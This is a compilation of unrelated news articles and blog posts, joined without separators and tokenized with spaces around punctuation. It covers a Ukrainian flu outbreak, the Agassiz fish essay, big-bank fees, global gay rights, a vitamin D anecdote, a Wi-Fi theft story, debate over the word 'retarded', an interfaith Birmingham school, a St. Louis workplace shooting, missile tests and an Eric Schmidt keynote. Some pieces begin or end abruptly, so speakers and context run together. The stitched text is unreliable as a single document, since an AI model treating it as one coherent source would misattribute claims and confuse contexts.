Optimism that authorities could quickly get to grips with the epidemic had proved premature , she said .
" Today the epidemic is not relaxing its embrace , " she said .
The outbreak of respiratory illness began in western Ukraine but is now spreading east , with cases appearing near the Russian border and in the south in Crimea .
On the streets of the capital , Kiev , many people are wearing face - masks .
People are being turned away from some embassies and other public buildings if they are not wearing masks .
The World Health Organisation says it is assuming most cases of influenza in Ukraine had been caused by the H1N1 virus .
WHO says the outbreak may indicate how the virus will develop in the northern hemisphere winter .
Yushchenko , who appears to have no chance of re-election according to popularity ratings , has accused Tymoshenko and Yanukovich of criminal negligence in the way they have handled the flu outbreak .
He said both leaders had been aware of the epidemic in the week they organised mass rallies for their own campaigns .
Tymoshenko on Wednesday renewed an accusation that Yushchenko could be preparing to introduce a state of emergency as a pretext for putting off the Jan. 17 election .

The Student , the Fish , and Agassiz
The following is a classic account of the importance of first - hand observation , and careful , intense , focused study .
It teaches lessons that apply to almost any discipline .
Indeed , it is widely used in colleges and universities across the U.S. as a teaching tool in both the humanities and the sciences .
Its lessons certainly apply to studying the Bible .
Too often students of the Bible rely on second - hand , derivative knowledge , acquired from pastors , teachers , parents , books about the Bible , or other secondary sources .
While all of these have their place , there is no substitute , in the end , for one 's own first - hand study and experience of the Scriptures , and for the joy of discovery .

The Student , the Fish , and Agassiz
by the Student
[ Samuel H. Scudder ]

It was more than fifteen years ago that I entered the laboratory of Professor Agassiz , and told him I had enrolled my name in the scientific school as a student of natural history .
He asked me a few questions about my object in coming , my antecedents generally , the mode in which I afterwards proposed to use the knowledge I might acquire , and finally , whether I wished to study any special branch .
To the latter I replied that while I wished to be well grounded in all departments of zoology , I purposed to devote myself specially to insects .
" When do you wish to begin ? " he asked .
" Now , " I replied .
This seemed to please him , and with an energetic " Very well , " he reached from a shelf a huge jar of specimens in yellow alcohol .
" Take this fish , " he said , " and look at it ; we call it a Haemulon ; by and by I will ask what you have seen . "
With that he left me , but in a moment returned with explicit instructions as to the care of the object entrusted to me .
" No man is fit to be a naturalist , " said he , " who does not know how to take care of specimens . "
I was to keep the fish before me in a tin tray , and occasionally moisten the surface with alcohol from the jar , always taking care to replace the stopper tightly .
Those were not the days of ground glass stoppers , and elegantly shaped exhibition jars ; all the old students will recall the huge , neckless glass bottles with their leaky , wax - besmeared corks , half - eaten by insects and begrimed with cellar dust .
Entomology was a cleaner science than ichthyology , but the example of the professor who had unhesitatingly plunged to the bottom of the jar to produce the fish was infectious ; and though this alcohol had " a very ancient and fish - like smell , " I really dared not show any aversion within these sacred precincts , and treated the alcohol as though it were pure water .
Still I was conscious of a passing feeling of disappointment , for gazing at a fish did not commend itself to an ardent entomologist .
My friends at home , too , were annoyed , when they discovered that no amount of eau de cologne would drown the perfume which haunted me like a shadow .
In ten minutes I had seen all that could be seen in that fish , and started in search of the professor , who had , however , left the museum ; and when I returned , after lingering over some of the odd animals stored in the upper apartment , my specimen was dry all over .
I dashed the fluid over the fish as if to resuscitate it from a fainting - fit , and looked with anxiety for a return of a normal , sloppy appearance .
This little excitement over , nothing was to be done but return to a steadfast gaze at my mute companion .
Half an hour passed , an hour , another hour ; the fish began to look loathsome .
I turned it over and around ; looked it in the face -- ghastly ; from behind , beneath , above , sideways , at a three - quarters view -- just as ghastly .
I was in despair ; at an early hour , I concluded that lunch was necessary ; so with infinite relief , the fish was carefully replaced in the jar , and for an hour I was free .
On my return , I learned that Professor Agassiz had been at the museum , but had gone and would not return for several hours .
My fellow students were too busy to be disturbed by continued conversation .
Slowly I drew forth that hideous fish , and with a feeling of desperation again looked at it .
I might not use a magnifying glass ; instruments of all kinds were interdicted .
My two hands , my two eyes , and the fish ; it seemed a most limited field .
I pushed my fingers down its throat to see how sharp its teeth were .
I began to count the scales in the different rows until I was convinced that that was nonsense .
At last a happy thought struck me -- I would draw the fish ; and now with surprise I began to discover new features in the creature .
Just then the professor returned .
" That is right , " said he , " a pencil is one of the best eyes .
I am glad to notice , too , that you keep your specimen wet and your bottle corked . "
With these encouraging words he added --
" Well , what is it like ? "
He listened attentively to my brief rehearsal of the structure of parts whose names were still unknown to me ; the fringed gill - arches and movable operculum ; the pores of the head , fleshly lips , and lidless eyes ; the lateral line , the spinous fin , and forked tail ; the compressed and arched body .
When I had finished , he waited as if expecting more , and then , with an air of disappointment :
" You have not looked very carefully ; why , " he continued , more earnestly , " you have n't seen one of the most conspicuous features of the animal , which is as plainly before your eyes as the fish itself .
Look again ; look again ! "
And he left me to my misery .
I was piqued ; I was mortified .
Still more of that wretched fish ?
But now I set myself to the task with a will , and discovered one new thing after another , until I saw how just the professor 's criticism had been .
The afternoon passed quickly , and when , towards its close , the professor inquired ,
" Do you see it yet ? "
" No , " I replied .
" I am certain I do not , but I see how little I saw before . "
" That is next best , " said he earnestly , " but I wo n't hear you now ; put away your fish and go home ; perhaps you will be ready with a better answer in the morning .
I will examine you before you look at the fish . "
This was disconcerting ; not only must I think of my fish all night , studying , without the object before me , what this unknown but most visible feature might be , but also , without reviewing my new discoveries , I must give an exact account of them the next day .
I had a bad memory ; so I walked home by Charles River in a distracted state , with my two perplexities .
The cordial greeting from the professor the next morning was reassuring ; here was a man who seemed to be quite as anxious as I that I should see for myself what he saw .
" Do you perhaps mean , " I asked , " that the fish has symmetrical sides with paired organs ? "
His thoroughly pleased , " Of course , of course ! " repaid the wakeful hours of the previous night .
After he had discoursed most happily and enthusiastically -- as he always did -- upon the importance of this point , I ventured to ask what I should do next .
" Oh , look at your fish ! " he said , and left me again to my own devices .
In a little more than an hour he returned and heard my new catalogue .
" That is good , that is good ! " he repeated , " but that is not all ; go on . "
And so for three long days , he placed that fish before my eyes , forbidding me to look at anything else , or to use any artificial aid .
" Look , look , look , " was his repeated injunction .
This was the best entomological lesson I ever had -- a lesson whose influence was extended to the details of every subsequent study ; a legacy the professor has left to me , as he left it to many others , of inestimable value , which we could not buy , with which we cannot part .
A year afterwards , some of us were amusing ourselves with chalking outlandish beasts upon the blackboard .
We drew prancing star - fishes ; frogs in mortal combat ; hydro - headed worms ; stately craw - fishes , standing on their tails , bearing aloft umbrellas ; and grotesque fishes , with gaping mouths and staring eyes .
The professor came in shortly after , and was as much amused as any at our experiments .
He looked at the fishes .
" Haemulons , every one of them , " he said ; " Mr. ____________ drew them . "
True ; and to this day , if I attempt a fish , I can draw nothing but Haemulons .
The fourth day a second fish of the same group was placed beside the first , and I was bidden to point out the resemblances and differences between the two ; another and another followed , until the entire family lay before me , and a whole legion of jars covered the table and surrounding shelves ; the odor had become a pleasant perfume ; and even now , the sight of an old six - inch worm - eaten cork brings fragrant memories !
The whole group of Haemulons was thus brought into review ; and whether engaged upon the dissection of the internal organs , preparation and examination of the bony framework , or the description of the various parts , Agassiz 's training in the method of observing facts in their orderly arrangement , was ever accompanied by the urgent exhortation not to be content with them .
" Facts are stupid things , " he would say , " until brought into connection with some general law . "
At the end of eight months , it was almost with reluctance that I left these friends and turned to insects ; but what I gained by this outside experience has been of greater value than years of later investigation in my favorite groups .

By James Kwak
From Stacy Mitchell of the New Rules Project , also on the Huffington Post :
This is something I ’ve long suspected based on anecdotal evidence .
According to Mitchell , it ’s nothing new :
“ The Fed ’s 1999 report , published five months before the Financial Services Modernization
Act passed , found that overdraft fees were 41 percent higher at big banks compared to small .
Big banks charged more for almost every fee imaginable , including 43 percent more for bounced checks , 57 percent more for stop - payment orders , and 18 percent more for ATM withdrawals .
“ But rather than allow the evidence in favor of smaller banks to guide policy , Congress decided to get rid of the evidence .
At the urging of then Fed chairman Alan Greenspan , Congress ordered the Federal Reserve to stop publishing its annual report on bank fees .
. . .
“ But , as it turns out , the firm that the Fed once employed to gather this data , Moebs Services , has continued to survey fees at more than 2,000 financial institutions .
Moebs agreed to share its 2009 data with the New Rules Project .
As our charts show , the biggest banks still impose much higher costs on their customers than small financial institutions do .
“ Not only are fees lower , but several studies have found that smaller banks and credit unions pay higher interest on savings accounts .
In a study published by the Federal Reserve Bank of Cleveland , researchers Kwangwoo Park and George Pennacchi examined data from 1998 to 2004 and found that rates on one - year CDs were an average of 14 percent higher at small banks ( under $ 1 billion in assets ) than at large ones ( assets of $ 10 billion or more ) and rates on interest - bearing savings accounts were 49 percent higher . ”
The article discusses some reasons why consumers continue to pay more in fees and get less interest on deposits .
I think it ’s a combination of better marketing by big banks , a general lack of comparison shopping , and low fee transparency .
( Price competition often bigs and ends at the words “ free checking . ” )
Big banks are also somewhat stickier because they can cross - sell more products , which makes them harder to leave .
But it can be done .
Editor 's Note :
We invite you to explore the global struggle for gay rights in 20 countries through Rainbow Planet 's interactive map which features population statistics , spending power , legal struggles , advances and setbacks and , most importantly , voices of men and women who are lesbian , gay , bisexual and transgender .
BOSTON — All across the world , countries , cultures , societies and religions are struggling with the issue of gay rights .
Over the last year , GlobalPost correpondents from China to Chile , Uganda to Lebanon have reported on compelling stories of the struggle of lesbian , gay , bisexual and transgender ( LGBT ) people for their rights .
Our stories recorded legal advances , like in Spain and Argentina , as well as setbacks , as in China , and complicated stories of how traditional societies are grappling with the issue , like in Senegal .
As the stories accumulated , we recognized that gay rights is an issue that resonates around the globe and so we decided to do this survey of 20 countries .
Our team found lightness , dark and most of all a half - light , where some progress in gay rights has been achieved but there are still obstacles .
In Australia , Sydney ’s Gay Pride parade is a festive carnival - like street celebration where thousands of tourists go to see transvestites in extravagant costumes cavort with musclemen .
It would seem that the land down under is a place where gays can enjoy full rights and tolerance .
But our reporter found that Australian laws do not allow gay marriage and in our interviews some Australian gay men say they still do not feel comfortable or safe .
The worldwide struggle for civil rights for gays has met with opposition from some religious groups .
GlobalPost columnists have explored different sides of these issues .
Right now Uganda is a flashpoint for gay rights because of the “ Anti-Homosexuality Bill ” currently before the parliament of that central African country .
Proposed by a Ugandan Christian , who had been a close associate of prominent American fundamentalists , the proposed law calls for the death penalty for those convicted of “ aggravated homosexuality , ” a new crime defined by the bill as gay sex with an underage person , an HIV positive person having gay sex , a person using alcohol or drugs to seduce someone into having gay sex or a serial offender .
( To hear from the gay community in Uganda , watch this video . )
Crowds in Kampala demonstrated in favor of the bill and at first many Kampala - based commentators thought it would pass easily .
But resistance to the bill grew domestically and internationally .
The influential U.S. pastor Rick Warren issued a statement denouncing the bill .
Then Uganda President Yoweri Museveni distanced himself from the bill , saying it was not simply an issue of domestic politics but it had become a “ foreign policy issue . ”
Now its passage is not certain .
In Brazil , same - sex relations are not criminalized so , according to a popular song , “ there are no sins south of the equator . ”
Although the country has a reputation for openness and sexual freedom , the actual legal rights of gay , lesbian , bisexual and transgender Brazilians are not clear .
The courts are ruling on several cases over topics ranging from inheritance to the rights of same - sex couples to adopt .
Despite growing public acceptance of homosexuality , there has been a wave of murders based on sexual orientation , 190 in 2008 .
This Rainbow Planet series also features gays telling absorbing stories about the situations in their countries .
Some say they are relatively happy , some say they feel they must hide their identity and others say they are afraid for their safety .
These quotes from the countries in the survey give a ground level account of what the situation is like for gays .
The survey looks at the legal situation in 20 countries from South Africa , where the rights of gay people and other minorities are enshrined in the constitution and same - sex marriage is legal , to Afghanistan , where under Shariah law same sex relations are illegal .
The legal situation rarely tells the full story , however .
In South Africa , for instance , there are still many hate crimes committed against gay people , such as the rape and murder last year of a member of the national women ’s soccer team , who had said she was a lesbian .
And in Afghanistan , there is a traditional practice in which a man has sex with a young boy .
In no country is the situation fully clear .
Rainbow Planet shows the complicated stories of the gay rights efforts worldwide .
There are horror stories and there are advances .
We have gathered information and narratives to improve understanding of the struggle for gay rights in all its complexity .
On Wednesday morning I had a nice chat over coffee with Oliver Gillie , a writer and researcher with a particular interest in vitamin D .
We spent much of our time talking about the role vitamin D may have in a wide range of conditions including role in a range of conditions including cancer , diabetes , multiple sclerosis and schizophrenia .
We also talked about the role of vitamin D in the functioning of the immune system .
We talked , for instance , about the ability of vitamin D to stimulate the production of anti-microbial compounds .
Back in June I devoted a post to some research which links vitamin D with protection from infection , including ‘ upper respiratory tract infections ’ ( URTIs ) such as coughs and colds .
This may have particular significance in winter , when vitamin D levels tend to fall .
In 2007 I wrote a post which played with the idea that peaks in rates of cold and flu in the wintertime might be related to relative vitamin D deficiency and the immune compromise this may induce .
Some of you may know that over the last year or so I have been on a personal mission to optimise my vitamin D levels .
I wrote about this most recently in December .
One of the commenters on this piece ( Nigeepoo ) raised the issue of vitamin D’s influence on resistance to infection , and expressed interest in how I would go before catching something .
I remembered this during my conversation with Oliver earlier this week .
It suddenly occurred to me that I have not had a single infection for at least a year .
As Nigeepoo pointed out , I might be at somewhat enhanced risk of contracting an infection because I see patients .
There may be some truth in this .
On top of this , I do a fair amount of air travel , and as many of us know , aircraft cabins can be incubating chambers for cold , flu and other infective organisms .
I spent a fair amount of time over Christmas a New Year in a house inhabited by people who went down with something viral at one time of another .
The bottom line is I ’ve had plenty of opportunity to contract a viral infection .
And through all of this , I have not had so much as a hint of infection .
No runny nose , cough , sore throat , fevered brow – nothing .
Going a whole year without any infection at all is , I think , rare if not unheard of for me .
For example , I remember going down with a cold / flu - like illness the previous Christmas ( 2008 ) that lasted a few days .
Now , it ’s impossible for me to say whether vitamin D has anything to do with this .
However , my personal experience is that optimising my vitamin D levels has coincided with a degree of immune resilience ( Nigeepoo had a similar experience ) .
Should I eventually succumb to something , I ’ll fess up in the form of a post .
Yeah , everyone has stolen Wi-Fi at one point or another , but not everyone has called into a tech show in order to complain about the fact that someone put the kibosh on said stealing .
Meet Jennifer , she had been unwittingly yoinking Wi-Fi for more than a year and a half when the gravy train ran out , after which she called into Leo Laporte 's Tech Guy radio show in a state of utter confusion .
After hitting YouTube this weekend — the show aired on Saturday — the video depicting Laporte interviewing the confused woman has gone viral , racking up 122,661 views at the time of this post .
Maybe it 's Jennifer 's innocent confusion ( " Yeah , well they should bring that cost down " ) , maybe it 's Laporte 's gentle / yet amused explanation that she was , in fact , putting her Internet privacy at risk while simultaneously breaking the law ( " So you have — silly question , but I 'm gonna ask it anyway — you have a wireless access point to begin with ? " ) , but something about this vid is striking a chord with Internet denizens .
Have you ever stolen Wi-FI ?
I questioned myself as I thought of and drew this editorial cartoon .
Even now I understand the impact of the word “ retard ” or “ retarded ” but I do n’t know if I am offended by every usage of it as others .
First some background .
Former Vice Presidential candidate and former Alaska Governor Sarah Palin continues to make news this month .
This week she was a keynote speaker at the Tea Party Convention .
During a Q&A discussion she could be seen checking out notes written on her hand .
And last week she called out President Obama to fire Chief of Stafe Rahm Emanuel for saying that some liberal activists are “ fucking retards ”
Yet when Chris Wallace confronted her about Rush Limbaugh ’s similar use , she blew it off as satire .
So when someone uses the word “ retard ” or “ retarded ” in jest it is OK .
HUH ??
As someone with a close relative who has Downs Syndrome , I would have to be restrained if someone called her a retard .
But I do n’t have the same visceral response if someone called me it or my ideas retarded .
So as I say , I struggle with whether or not “ retarded ” should be avoided in all speech .
For those who have an issue with using “ retarded ” , do you have similar issues with words like “ idiot ” , “ moron ” or “ imbecile ” ??
If not , why not ??
All of those words were used as IQ categories before the term “ mentally retardation ”
We now use terms such as “ special ” and “ developmentally disabled ” .
In 25 years , will those too be considered bad ?
What is your opinion ??

It 's infant prize day at King David School , a state primary in Moseley , Birmingham .
The children sit cross-legged on the floor , their parents fiddling with their video cameras .
The head , Steve Langford , is wearing a Sesame Street tie .
A typical end - of - term school event , then .
But at King David there 's a twist that gives it a claim to be one of the most extraordinary schools in the country : King David is a strictly Jewish school .
Judaism is the only religion taught .
There 's a synagogue on site .
The children learn modern Hebrew - Ivrit - the language of Israel .
And they celebrate Israeli independence day .
But half the 247 pupils at the 40 - year - old local authority - supported school are Muslim , and apparently the Muslim parents go through all sorts of hoops , including moving into the school 's catchment area , to get their children into King David to learn Hebrew , wave Israeli flags on independence day and hang out with the people some would have us believe that they hate more than anyone in the world .
Download the new Independent Premium app Sharing the full story , not just the headlines
The Muslim parents , mostly devout and many of the women wearing the hijab , say they love the ethos of the school , and even the kosher school lunches , which are suitable because halal and kosher dietary rules are virtually identical .
The school is also respectful to Islam , setting aside a prayer room for the children and supplying Muslim teachers during Ramadan .
At Eid , the Muslim children are wished Eid Mubarak in assembly , and all year round , if they wish , can wear a kufi ( hat ) .
Amazingly , dozens of the Muslim children choose instead to wear the Jewish kipah .
At the prize morning Carol Cooper , the RE teacher , says : " Boker tov , " ( Ivrit for " Good morning " ) .
" Good morning Mrs Cooper , " the children chant in reply .
The entire school , Muslims , Jews , plus the handful of Christians and Sikhs then say the Shema , the holiest Jewish prayer , all together .
The Year Four violin club ( five Muslims , two Jews ) play " Little Bird , I Have Heard " .
Just as many prizes are being distributed to Hussains and Hassans and Shabinas as there are to Sauls and Rebeccas and Ruths .
In fact , if anything , the Muslim children have beaten the Jewish ones .
Thus does the Elsie Davis Prize for Progress go to a beaming little lad called Walid , the religious studies prize to a boy called Imran wearing a kipah and the progress prizes for Hebrew , to a boy called Habib and a girl called Alia .
Times being as they are , King David does n't advertise its presence in a city where its pioneering multiculturalism could raise all kinds of unwelcome attention .
There 's a discreet signboard outside that reveals little about the school 's unique nature .
There are watchful video cameras high up on the walls , plus two electronic gates to pass through .
Sadly , it is , to a significant extent , says Laurence Sharman , the ( Christian ) chairman of the PTA , " an undercover school " .
The Muslim parents , however , are only too keen to talk in the playground about what might be seen by some in their communities as a controversial schooling decision .
" We actually bought a flat in the catchment area for the children to come here , " says Nahid Shafiq , the mother of Zainah , four , and Hamza , nine , and wife of Mohammed , a taxi driver .
" We were attracted by the high moral values of the school , and that 's what we wanted our kids to have .
None of us has any problem with it being a Jewish school .
Why on earth should we ?
Our similarities as religions and cultures are far greater and more important than our differences .
It 's not even an issue .
" At the mosque , occasionally , people ask why we send the children here , but there is no antagonism whatsoever , and neither is there from anyone in our family .
In fact , it was a big family decision to try and get them into King David .
This is the real world .
This is the way real people do things in the real world .
All the violence and prejudice and problems - that 's not real , that 's just what you see on the news . "

Fawzia Ismail ( the mother of Aly - Raza , nine , and Aliah , six ) is equally positive .
" My nephew came here and my brother showed me the school , so it 's a bit of a family tradition now .
We 're very , very pleased with the school .
It 's so friendly .
All the kids mix and go to one another 's parties and are in and out of each other 's houses .
They teach a bit about Israel , but we do n't have any problem with that .
There are such similarities between our people and our societies . "
Irum Rashid ( mother of Hanan , nine , and Maryam , four ) says that a lot of people in Small Heath are considering moving to Moseley because of King David .
" It 's a very happy school , the behaviour is fantastic , the food is great - because it 's kosher - and so are the SATs results . "
But what about learning Hebrew and the Jewish prayers ?
" I think it 's great .
The more knowledge , the more understanding , " says one of the mothers .
" They learn all they need about Islam at mosque school .
Actually , the kids often sing Hebrew songs in the bath , which is a bit confusing because we speak Gujarati at home , but I think it 's great . "
The Jewish parents and teachers I speak to are just as enthusiastic .
" You know , in these difficult times in the world , I think we show how things should be done .
It 's really a bit of a beacon , " says one teacher , whose three children all went to King David and ended up at Oxford University .
Parent Trevor Aremband is from South Africa .
" In Johannesburg , we have Jewish schools , but they 're 100 per cent Jewish , so we were a bit shocked when we first came here .
But the integration works so well .
It 's clearly the way to go in today 's world .
My son is eight and has loads of Muslim friends . "
The most important thing , I am told repeatedly , is that the cross-cultural friendships forged at King David last a lifetime .
I hear a conversation about how a Rebecca is going to fly over from the States for a Fatima 's wedding .
I am told about a pair of lads , one Jewish , one Muslim , who became friends the day they started in the nursery , went to senior school together as well as to university and are now living close to one another with their wives and families and are currently on holiday together .
King David was not designed to be such a beacon of inter - faith cooperation and friendship .
Founded in 1865 as The Hebrew School , it was 100 per cent Jewish until the late 1950s .
Then two things began to happen : there was a growth in the Muslim population in middle - income areas such as Moseley , and a shrinking of Britain 's Jewish community , especially outside the main centres of London and Manchester .
Muslim children started coming to the school in the early 1960s , but the current position , in which they are in the majority ( Jewish children comprise 35 per cent , Muslims 50 per cent , Christians , Sikhs and other , 15 per cent ) is very new .
" One of the things that surprises people about this school , " says Langford , " is that it 's not an especially privileged intake .
Half of our kids have English as an additional language .
But the amazing thing is how well it all works .
We have a new little boy here from China , whose only English a few weeks ago was to ask for the toilet .
He now speaks English - and can say the Shema perfectly .
" If you gauge success , for instance , by racial incidents , which schools always have to report to the LEA , we have at the most one a term .
And that can just mean some harsh words with a racial slant used in the playground .
At multicultural inner city schools where I 've taught , there will be far , far more than that , possibly one or more a week . "
In terms of SATs and Ofsted inspections , King David has also shone .
It is rated as good - the second highest possible ranking - in all areas , and Ofsted made a special mention at the last inspection of the integration between children of different faiths and races .
In the recent SATs results , the school also came in well above the national average in all subjects .
Steve Langford , a Warwick University economics graduate , is himself a bit of a paradox .
He is Church of England on both parental sides and only became interested in Judaism when he worked in a Jewish summer camp in Massachusetts in his gap year .
His interest paid off when he got a teaching job a King David .
Now he is learning Ivrit at evening classes and goes to Israel for holidays .
The Rabbi of Birmingham 's Singers Hill Synagogue , one of the financial backers of King David , is proud of Steve Langford and of the school 's extraordinary interfaith record .
" King David School is amazing , " says Rabbi Tann .
" The reason I think it works well is that racism is engendered entirely by adults .
Children do n't have it within themselves .
Their natural mode is to play happily with everyone .
It 's only when adults say , ' Do n't play with him , he 's black , or do n't have anything to do with him , he 's Muslim , that troubles begin . '
" We never have any racial or inter - faith problems at all .
Not ever .
In 20 years here , it 's simply never happened in any significant way .
We teach that if you do n't like someone , you avoid them .
Do n't play with them .
Go to the other side of the playground .
I believe that if more people followed the lead of King David School , we'd have a much more peaceful world . "

St. Louis , Missouri ( CNN ) --
An employee at a transformer manufacturing company opened fire on his co-workers Thursday , killing three people before turning the gun on himself , police said .
Five other ABB Inc. employees were wounded in the shooting in the company 's factory in St. Louis , police said .
A law enforcement official identified the suspect as Timothy Hendron .
Hendron is among a group of ABB employees listed in a lawsuit filed in 2006 against administrators of the company 's retirement plan .
The suit , filed in federal court , accuses the administrators of , among other things , causing the plan to include " unreasonable and excessive " fees and expenses , paid by participants , without their knowledge and not used for their benefit or that of the plan .
Linda Siegfried , a spokesman for the law firm representing the plaintiffs , confirmed to CNN that Hendron was among the plaintiffs , although his name is spelled three different ways in court documents .
A trial on the matter is taking place in Kansas City , Missouri , Siegfried said .
She did n't know whether Hendron would have been required to be present .
Online federal court records show the trial began Tuesday .
Siegfried would not comment further except to say the firm offers its concern for the welfare of the victims .
The shooting occurred just before 6:30 a.m.
Arriving officers were told that a man had entered the building with a rifle and a handgun , and that several people had been shot , police said .
" Police made a perimeter around the business and located those victims who needed medical attention , " a St. Louis Metropolitan Police statement said .
Of the five at area hospitals , three victims were in critical condition and two in fair condition , police said .
KSDK : Four dead , five wounded at ABB Power
Authorities conducted a room - to - room search of the large building , as well as surrounding buildings at the ABB complex , the statement said .
Interstate 70 and surface streets in the area were initially shut down .
ABB spokesman Bob Fesmire said earlier that about 100 employees work at the facility , but some of them were unable to come in Thursday because of heavy snow .
CNN 's Kara Devlin , Ashley Hayes and Carol Cratty contributed to this report .
US officials blamed a radar malfunction for the failed test
A US missile defence test designed to shoot down long - range missiles was aborted when the radar system failed .
Rick Lehner , a Missile Defense Agency spokesman , said the target missile represented the type of technology that North Korea or Iran might develop .
The target was launched from the Marshall Islands in the Pacific and the interceptor missile from California .
The Pentagon said those two components performed as expected , but the sea - based X - band radar system failed .
The system has been under development for many years at the cost of tens of billions of dollars , and the Pentagon will be embarrassed by the failure , says the BBC security correspondent Nick Childs .
In the exercise on Sunday , a target missile was fired from Kwajalein in the Marshall Islands , and the interceptor from Vandenberg Air Force base in California , the Missile Defense Agency said .
The target represented " the type of technology that a country such as North Korea or Iran might be able to develop in the future that would threaten the United States , " Mr Lehner told the French news agency , AFP .
The test came as the Pentagon released a report warning that Iran and North Korea 's intermediate and shorter - range missiles posed regional threats to US forces and their allies .
Last week , the US said it was speeding up the deployment of ships off the Iranian coast and Patriot anti-missile systems in several Gulf countries to counter what it sees as a growing Iranian threat .
An investigation would be conducted into the cause of the test failure , US officials said .

With the successful test launch of Agni-V , India will acquire its first credible nuclear deterrent .
The forthcoming launch of Agni-V , with a range of 5,000 km , has several strategic implications .
The missile puts India in a select club of nations that possess a strategic arsenal .
This would mean an ability to launch intercontinental ballistic missiles ( ICBMs ) .
Technically , for such a capability , India would need a missile with a reach of 5,500 km .
However , upgrading the range of an ICBM from the current 5,000 km is not a difficult task .
Besides , even with its existing range , many important strategic assets in China would be within the missile ’s target range .
The upcoming test is critical to securing India ’s strategic space , given that Sino - Indian relations are still volatile and the Chinese have gone into armament overdrive , with new ballistic missiles such as the DF31 ICBM .
Agni-V is not only capable of hitting major targets in China , it is also likely to be India ’s first missile with multiple , independently targeted re-entry vehicles .
This means the capability to launch up to 10 nuclear weapons from one missile .
This acts as a tremendous force multiplier , and is the backbone of deterrence worldwide .
Agni-V is a three - stage , solid - fuelled missile with composite motor - casing in the third stage .
Two stages of this missile are constructed of composite materials , which help in reducing weight while increasing the range .
The other major advantage of this new missile is that unlike Agni-III , it can be packed into a canister and transported over long distances .
With mobility come two key deterrent advantages .
One , it can be moved to the frontlines in a relatively short time .
The second advantage is that canistered missiles make for great decoys .
Finding out which canister in which train has a missile , and which is a dummy , is fiendishly difficult .
This forces the enemy to deploy greater resources ( in surveillance and missile capability ) to track and destroy Indian missiles .
The Chinese have taken note of the proposed test and their state - run media have already run comparisons with the Chinese DF31 , one version of which has a range of 11,000 km .
The success of India ’s missile programme is amazing when you compare it with other projects of the DRDO , most of which have been miserable failures .
The reason for the missile programme ’s success lies in its originality .
A programme built from scratch , it is not aimed at import substitution .
This allows for creativity in thinking and implementation .
What ’s more , the programme has been focused on a few projects , unlike sundry other DRDO initiatives aimed at making fighter jets , tanks and even fruit juice .
Lastly , in the initial stages of India ’s Integrated Missile Development Programme , the Russians had been very helpful with designs , technology and scientists on site .
Agni-V is not the only achievement of our missile scientists .
India has steadily improved upon its anti-ballistic missile capability .
In this field , the nation has an edge over China .
Over the past three years — that is , ever since our first anti-ballistic missile test —
India has had three successes in three tests .
This has , surprisingly , not received its due media coverage , given that it is , by any standards , a remarkable achievement .
Shooting a missile mid-air requires computation power , technical sophistication and theatre information dominance .
It also credibly boosts India ’s deterrence posture since the enemy would have to deploy more missiles than would be the case were India not to have anti-ballistic missile capability .
Besides Agni , the most important missile to be tested this year will be K15 , which has a range of 700 km .
A different version of the same missile was tested from a submerged pontoon last year .
K15 will give India a critical third element of the nuclear triad — the ability to fire from an underwater submarine .
While China with its Jin-class submarines is way ahead here , this capability will complete the first step of India ’s nuclear triad .
For way too long , India has been surrounded by nations with the capability to annihilate .
At long last , Armageddon with an Indian address is at hand .

Google CEO Eric Schmidt gave a keynote address at the Mobile World Congress yesterday , which is worth watching if you have an interest in the future of technology or , well , human life .
The talk was an informative and open insight into Google ’s future direction .
It was centred on mobile ; but since Google now regards the mobile phone as the primary device for how we interact with the world , that was no limitation .
Google is putting mobile first , said Schmidt , because it is the meeting point for the three things that matter : computing , connectivity and the cloud .
He believes that phones will replace credit cards , for example , as they are smarter and more secure for financial transactions .
Google ’s strategy is to combine the near - unlimited power of server - side computing with its database of human behaviour , to create devices that are “ like magic .
All of a sudden there are things you can do that were not previously possible . ”
He gave an illuminating example : Google voice search .
You speak into your phone , and Google transcribes your voice and performs a search .
Voice recognition is nothing new , but the difference in the Google demo is that it works .
Here ’s how .
The problem with voice recognition is that one word sounds very like another , especially since we do not speak with precision and every voice varies .
Computers cannot understand exactly what we say , but they can use dictionaries to come up with a set of possibilities for what we said , one of which is likely to be correct .
The next step is the brilliant one .
Google takes this set of possible phrases and compares it to recent Google searches .
If one of them matches a popular search , then it is likely to be what you said .
Bingo .
Google now does this in four languages , with German demonstrated for the first time yesterday .
It works on the assumption that humans are not very original .
We tend to do similar things , and to be interested in similar things .
Therefore , as Schmidt noted , if you are a tourist walking around a city with your location - aware phone , Google does not only know where you are ; it also has a good idea of where you will go next .
Another cool demo is for image recognition .
We saw this in two guises .
In one , you hold up your phone and do an image search using the camera as input .
Result : information about the building you are looking at .
[ Or maybe the person ?
Hmm . ]
In another demo , you point the camera at your foreign - language menu as you ponder which incomprehensible dish might be one you could eat .
Back comes the translation in your own language .
Note that these demonstrations are not really about super - powerful phones , but rather about the other two factors mentioned above , the power of cloud computing combined with a vast database of knowledge .
Schmidt ’s blind spot is that he does not really see privacy as an issue .
He mentions it from time to time ; but he is clear that he regards the trade - off , that we give our personal data to Google in return for these cool services , as worth it .
I posted a remarkable quote yesterday .
Here ’s another one , from late on in the address :
Google will know more about the customer because it benefits the customer if we know more about them .
What Schmidt fails to do is to extrapolate the implications for stuff other than cool services .
One is what happens if that huge database is used dishonourably .
Another is the huge competitive advantage it gives to Google versus everyone else ; Google has this data , but rest of us do not .
A third is how that data could be used in ways that disadvantage us .
An example is in insurance .
Insurance is about pooling risk .
The more data insurance companies have about you , the more accurately they can assess the risk , which means a wider range of premiums .
If by some mechanism insurance companies are able to analyse Google ’s data to assess risk , they can refuse to insure , or charge high penalties , for the higher risks .
We wo n’t necessarily enjoy that , because it means more us may find it impossible to get the insurance we want at a price we can afford .
Google ’s business strategy
That ’s the technical side .
What are Google ’s business plans ?
Schmidt made some interesting comments here as well , many of them in the question and answer session .
Google does not plan to become a mobile operator .
Schmidt received some fairly hostile questions on this topic .
Since Google positions operators as dumb pipes , stealing their talk minutes and insisting on an open web for services , who will invest in infrastructure ?
Schmidt denies positioning operators as dumb pipes , but does not leave them room for much other than infrastructure ; he says they might have a role in financial transactions .
How do we ( both Google and the rest of us ) make money ?
Two main areas , according to Schmidt .
One is advertising .
He says that online advertising spend is currently one tenth of the total , and that this proportion must grow since “ consumers are moving from offline to online . ”
In addition , mobile advertising will be huge since you can target location as well as using other data to personalise ads .
“ The local opportunity is much larger , and largely unexplored , ” he says .
The other big opportunity is apps .
The number of apps that need to be installed locally is constantly diminishing , he says , leaving great potential for new cloud - based applications and services .
As for Google , Schmidt says it wants to be part of everything you do :
We want to have a little bit of Google in every transaction on the internet
Thought - provoking stuff , and a force that will be hard to resist .
